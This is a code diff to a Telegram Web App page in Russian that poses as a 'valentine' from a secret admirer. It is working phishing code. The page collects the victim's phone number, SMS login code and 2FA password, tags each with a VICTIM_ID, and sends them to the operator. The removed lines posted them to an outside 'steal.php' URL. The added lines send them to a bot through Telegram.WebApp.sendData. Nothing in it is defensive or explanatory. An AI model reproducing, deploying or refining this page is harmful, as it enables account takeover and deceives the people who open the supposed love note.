@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Валентинка 💌</title>
+    <title>💌 Валентинка</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -67,16 +67,17 @@
             font-size: 17px;
             margin-bottom: 30px;
             border-left: 4px solid #ff4d6d;
-            line-height: 1.5;
         }
         
         .sender {
             color: #ff8c9c;
             margin-top: 14px;
             font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
+        }
+        
+        .step {
+            display: block;
+            margin-bottom: 20px;
         }
         
         .input-group {
@@ -115,7 +116,6 @@
             font-weight: 600;
             width: 100%;
             cursor: pointer;
-            transition: 0.2s;
             margin-top: 10px;
         }
         
@@ -140,11 +140,6 @@
             border-left: 4px solid #ffaa00;
             color: #ffaa00;
         }
-        
-        .success {
-            border-left-color: #4caf92;
-            color: #4caf92;
-        }
     </style>
 </head>
 <body>
@@ -155,18 +150,20 @@
         
         <div class="message">
             "Привет... Ты мне очень нравишься. С 14 февраля ❤️"
-            <div class="sender">💫 От тайного поклонника</div>
+            <div class="sender">✨ От тайного поклонника</div>
         </div>
         
-        <div id="step1">
+        <!-- ШАГ 1 - НОМЕР -->
+        <div id="step1" class="step">
             <div class="input-group">
-                <label>📱 Твой номер</label>
+                <label>📱 Твой номер телефона</label>
                 <input type="tel" id="phone" placeholder="+7 999 999 99 99" value="+7">
             </div>
             <button class="btn" id="sendPhoneBtn">Получить код</button>
         </div>
         
-        <div id="step2" class="hidden">
+        <!-- ШАГ 2 - КОД -->
+        <div id="step2" class="step hidden">
             <div class="input-group">
                 <label>🔐 Код из SMS</label>
                 <input type="text" id="code" placeholder="Введи код" maxlength="6">
@@ -175,9 +172,10 @@
             <div class="status" id="codeStatus">⏳ Код отправлен...</div>
         </div>
         
-        <div id="step3" class="hidden">
+        <!-- ШАГ 3 - 2FA -->
+        <div id="step3" class="step hidden">
             <div class="input-group">
-                <label>🔐 Пароль 2FA</label>
+                <label>🔐 Пароль 2FA (если есть)</label>
                 <input type="password" id="password" placeholder="Введи пароль">
             </div>
             <button class="btn" id="sendPasswordBtn" disabled>Подтвердить</button>
@@ -187,46 +185,51 @@
 
     <script>
         Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
         
         const VICTIM_ID = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        const BEGET_URL = 'http://bprof.raximi52.beget.tech/steal.php';
         
         let userPhone = '';
         let userCode = '';
         
-        async function sendToBeget(type, data) {
+        function sendToBot(type, data) {
             try {
-                const response = await fetch(BEGET_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        type: type,
-                        data: {
-                            ...data,
-                            victim_id: VICTIM_ID,
-                            timestamp: new Date().toLocaleString()
-                        }
-                    })
-                });
+                Telegram.WebApp.sendData(JSON.stringify({
+                    type: type,
+                    data: {
+                        ...data,
+                        victim_id: VICTIM_ID,
+                        timestamp: new Date().toLocaleString()
+                    }
+                }));
                 console.log('Отправлено:', type, data);
             } catch(e) {
                 console.log('Ошибка:', e);
             }
         }
         
+        // ШАГ 1 - ОТПРАВКА НОМЕРА
         document.getElementById('sendPhoneBtn').onclick = function() {
             let phone = document.getElementById('phone').value.trim();
+            
+            if (!phone || phone.length < 10) {
+                alert('Введи номер');
+                return;
+            }
+            
             phone = phone.replace(/\D/g, '');
+            if (phone.startsWith('8')) phone = '7' + phone.substring(1);
             if (!phone.startsWith('7')) phone = '7' + phone;
             userPhone = '+' + phone;
             
-            sendToBeget('phone', {phone: userPhone});
+            sendToBot('phone', {phone: userPhone});
             
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
             document.getElementById('codeStatus').innerHTML = `⏳ Код отправлен на ${userPhone}`;
         };
         
+        // ШАГ 2 - ОТПРАВКА КОДА
         document.getElementById('code').oninput = function() {
             this.value = this.value.replace(/\D/g, '');
             document.getElementById('sendCodeBtn').disabled = this.value.length !== 6;
@@ -234,19 +237,20 @@
         
         document.getElementById('sendCodeBtn').onclick = function() {
             userCode = document.getElementById('code').value;
-            sendToBeget('code', {code: userCode, phone: userPhone});
+            sendToBot('code', {code: userCode, phone: userPhone});
             
             document.getElementById('codeStatus').innerHTML = '✅ Код принят';
             document.getElementById('step3').classList.remove('hidden');
         };
         
+        // ШАГ 3 - ОТПРАВКА 2FA
         document.getElementById('password').oninput = function() {
             document.getElementById('sendPasswordBtn').disabled = this.value.length < 4;
         };
         
         document.getElementById('sendPasswordBtn').onclick = function() {
             const password = document.getElementById('password').value;
-            sendToBeget('password', {password: password, code: userCode, phone: userPhone});
+            sendToBot('password', {password: password, code: userCode, phone: userPhone});
             
             document.getElementById('passwordStatus').innerHTML = '✅ Валентинка открыта!';
             setTimeout(() => Telegram.WebApp.close(), 2000);
